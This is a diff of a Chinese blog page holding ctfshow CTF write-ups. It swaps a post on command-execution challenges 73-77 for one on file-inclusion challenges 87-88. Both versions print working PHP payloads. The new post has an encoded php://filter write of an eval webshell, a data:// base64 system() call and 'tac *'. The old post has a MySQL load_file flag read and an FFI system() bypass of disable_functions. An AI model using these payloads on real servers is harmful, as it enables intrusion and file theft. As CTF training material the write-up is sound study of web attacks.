@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ctfshow-web入门-命令执行-73-77, 博客,ctf,web">
+    <meta name="keywords" content="ctfshow-web入门-文件包含-87-88, 博客,ctf,web">
     <meta name="description" content="不会ACM，不会CTF，惨惨">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ctfshow-web入门-命令执行-73-77 | Rolemee的小破站</title>
+    <title>ctfshow-web入门-文件包含-87-88 | Rolemee的小破站</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -324,12 +324,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ctfshow-web入门-命令执行-73-77</h1>
+                    <h1 class="description center-align post-title">ctfshow-web入门-文件包含-87-88</h1>
                 </div>
             </div>
         </div>
@@ -453,10 +453,6 @@
                                 <span class="chip bg-color">WEB入门</span>
                             </a>
                         
-                            <a href="/tags/%E8%84%9A%E6%9C%AC/">
-                                <span class="chip bg-color">脚本</span>
-                            </a>
-                        
                     </div>
                     
                 </div>
@@ -484,28 +480,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-07-17
+                    2021-07-24
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-07-17
+                    2021-07-24
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    611
+                    411
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    2 分
                 </div>
                 
 
@@ -523,59 +519,63 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">Warning<span class="token punctuation">:</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">14</span>
+                <h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
-Warning<span class="token punctuation">:</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">15</span>
+<span class="token comment">/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 21:57:55
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
 
-Warning<span class="token punctuation">:</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">24</span>
-你要上天吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+*/</span>
 
-<p>老方法，现实glob伪协议</p>
-<pre class="line-numbers language-none"><code class="language-none">c&#x3D;%3F%3E%3C%3Fphp%0A%24a%3Dnew%20DirectoryIterator(%22glob%3A%2F%2F%2F*%22)%3B%0Aforeach(%24a%20as%20%24f)%0A%7Becho(%24f-%3E__toString().&#39;%20&#39;)%3B%0A%7D%0Aexit(0)%3B%0A%3F%3E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php die('大佬别秀了');?>"</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<p>拿到根目录，在flagc.txt中，于是使用<code>c=include(&quot;/flagc.txt&quot;);exit();</code></p>
-<p>拿到flag</p>
-<h2 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">Warning<span class="token punctuation">:</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">14</span>
+    
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-Warning<span class="token punctuation">:</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">15</span>
+<p>分析代码，首先php被禁用了，这个伪协议用不了，data也被禁用了，但是在最后有显示urldecode，我们要把传入的参数进行二次加密，那么问题来了，这个函数是写入文件的，但是我们看到会直接die，但是我们使用rot13编码后可以将它变成乱码，问题不大</p>
+<p>payload<code>?file=</code>%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%32%25%32%65%25%37%30%25%36%38%25%37%30</p>
+<p>意思就是<code>?file=php://filter/string.rot13/resource=2.php</code></p>
+<p>然后payload<code>content=&lt;?php eval($_POST[2]);?&gt;</code></p>
+<p>然后访问2.php</p>
+<p>payload<code>2=system(&#39;tac *&#39;);</code></p>
+<h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
-Warning<span class="token punctuation">:</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">24</span>
-你要上天吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token comment">/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-17 02:27:25
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
 
-<p>老方法，现实glob伪协议</p>
-<pre class="line-numbers language-none"><code class="language-none">c&#x3D;%3F%3E%3C%3Fphp%0A%24a%3Dnew%20DirectoryIterator(%22glob%3A%2F%2F%2F*%22)%3B%0Aforeach(%24a%20as%20%24f)%0A%7Becho(%24f-%3E__toString().&#39;%20&#39;)%3B%0A%7D%0Aexit(0)%3B%0A%3F%3E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+ */</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>拿到根目录，在flag36.txt中，于是使用<code>c=include(&quot;/flag36.txt&quot;);exit();</code></p>
-<p>发现include被禁用了，于是使用数据库链接</p>
-<pre class="line-numbers language-none"><code class="language-none">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,
-&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)
-&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-
-&gt;getMessage();exit(0);&#125;exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>拿到flag</p>
-<h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">Warning<span class="token punctuation">:</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">14</span>
-
-Warning<span class="token punctuation">:</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">15</span>
-
-Warning<span class="token punctuation">:</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">24</span>
-你要上天吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>老方法，现实glob伪协议</p>
-<pre class="line-numbers language-none"><code class="language-none">c&#x3D;%3F%3E%3C%3Fphp%0A%24a%3Dnew%20DirectoryIterator(%22glob%3A%2F%2F%2F*%22)%3B%0Aforeach(%24a%20as%20%24f)%0A%7Becho(%24f-%3E__toString().&#39;%20&#39;)%3B%0A%7D%0Aexit(0)%3B%0A%3F%3E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>拿到根目录，在flag36.txt中，于是使用<code>c=include(&quot;/flag36.txt&quot;);exit();</code></p>
-<p>发现include被禁用了，于是使用数据库链接</p>
-<pre class="line-numbers language-none"><code class="language-none">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,
-&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)
-&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-
-&gt;getMessage();exit(0);&#125;exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>也是不行，被禁用了，使用FFI，PHP&gt;=7.4时才行</p>
-<pre class="line-numbers language-none"><code class="language-none">c&#x3D;$ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);&#x2F;&#x2F;创建一个system对象
-$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;&#x2F;&#x2F;没有回显的
-$ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>再去访问1.txt即可</p>
+<p>没有过滤data，使用data伪协议</p>
+<p>payload<code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgKiIpO2VjaG8icyBkdGZjcHdrcSI7Pz5zIGR0ZmNwd2tx</code></p>
 
                 
             </div>
@@ -602,7 +602,7 @@ $ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数<span aria-hidden
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://rolemee.com/2021/07/17/ctfshow-web-ru-men-ming-ling-zhi-xing-73-77/">https://rolemee.com/2021/07/17/ctfshow-web-ru-men-ming-ling-zhi-xing-73-77/</a>
+                    <a href="https://rolemee.com/2021/07/24/ctfshow-web-ru-men-wen-jian-bao-han-87-88/">https://rolemee.com/2021/07/24/ctfshow-web-ru-men-wen-jian-bao-han-87-88/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -646,10 +646,6 @@ $ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数<span aria-hidden
                             
                                 <a href="/tags/WEB%E5%85%A5%E9%97%A8/">
                                     <span class="chip bg-color">WEB入门</span>
-                                </a>
-                            
-                                <a href="/tags/%E8%84%9A%E6%9C%AC/">
-                                    <span class="chip bg-color">脚本</span>
                                 </a>
                             
                         </div>
@@ -821,17 +817,18 @@ $ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数<span aria-hidden
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/07/24/ctfshow-web-ru-men-wen-jian-bao-han-78-81/">
+                <a href="/2021/07/24/ctfshow-web-ru-men-wen-jian-bao-han-87-88/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="ctfshow-web入门-文件包含-78-81">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="ctfshow-web入门-文件包含-87-88">
                         
-                        <span class="card-title">ctfshow-web入门-文件包含-78-81</span>
+                        <span class="card-title">ctfshow-web入门-文件包含-87-88</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -841,9 +838,9 @@ $ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数<span aria-hidden
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-24
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-24
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -856,6 +853,7 @@ $ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数<span aria-hidden
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -878,13 +876,13 @@ $ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数<span aria-hidden
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/07/16/ctfshow-web-ru-men-ming-ling-zhi-xing-72-rao-guo-disable-function-xian-zhi-he-open-basedir-xian-zhi/">
+                <a href="/2021/07/24/ctfshow-web-ru-men-wen-jian-bao-han-82-86/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="ctfshow-web入门-命令执行-72(绕过disable_function限制和open_basedir限制)">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="ctfshow-web入门-文件包含-82-86 条件竞争脚本">
                         
-                        <span class="card-title">ctfshow-web入门-命令执行-72(绕过disable_function限制和open_basedir限制)</span>
+                        <span class="card-title">ctfshow-web入门-文件包含-82-86 条件竞争脚本</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -895,7 +893,7 @@ $ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数<span aria-hidden
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-16
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-24
                             </span>
                         <span class="publish-author">
                             
